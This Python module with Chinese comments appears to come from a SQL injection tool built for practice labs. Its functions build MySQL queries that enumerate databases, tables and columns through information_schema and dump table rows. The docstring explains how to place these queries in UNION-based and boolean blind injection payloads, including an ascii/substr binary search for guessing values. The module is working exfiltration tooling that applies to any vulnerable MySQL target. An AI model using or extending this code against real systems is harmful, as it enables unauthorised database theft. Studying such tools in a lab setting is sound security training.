"""数据提取的 SQL 构造器（纯函数，只拼字符串、不发请求）。

统一约定：所有函数返回一条“标量 SELECT”，例如：
    SELECT database()
    SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata

两种模式复用同一套 SQL：
    UNION 模式：作为子查询包上 ^^$$ 哨兵放进回显位（1 次请求拿全量）
    盲注模式 ：作为子查询塞进 and ascii(substr((...),i,1))>n 里二分猜解
这就是“构造与发送分离”带来的好处。

注意：GROUP_CONCAT 默认最多拼 1024 字节（group_concat_max_len），
靶场数据量小够用；真实场景需要用 limit/where 分批。
"""

ROW_SEP = "~~"   # 导出多行数据时的行分隔符


# ---------- 基础信息 ----------

def sql_version():
    return "SELECT version()"


def sql_current_db():
    return "SELECT database()"


def sql_current_user():
    return "SELECT user()"


# ---------- 枚举 ----------

def sql_databases():
    """所有数据库名，GROUP_CONCAT 后逗号分隔。"""
    return "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata"


def sql_tables(db):
    """指定库的所有表名。"""
    return ("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
            f"WHERE table_schema='{db}'")


def sql_columns(db, table):
    """指定表的所有列名。"""
    return ("SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
            f"WHERE table_schema='{db}' AND table_name='{table}'")


# ---------- 导出数据 ----------

def sql_dump(db, table, columns, limit=10):
    """导出表数据：每行各列用 | 分隔（0x7c），行与行用 ~~ 分隔。

    因为 GROUP_CONCAT 直接配 LIMIT 不生效（聚合后只剩 1 行），
    所以先在内层子查询里 LIMIT，再交给外层聚合。
    """
    cols_expr = ",0x7c,".join(f"`{c}`" for c in columns)      # `id`,0x7c,`username`,...
    inner_cols = ",".join(f"`{c}`" for c in columns)          # `id`,`username`,...
    return (f"SELECT GROUP_CONCAT({cols_expr} SEPARATOR '{ROW_SEP}') "
            f"FROM (SELECT {inner_cols} FROM `{db}`.`{table}` LIMIT {limit}) t")
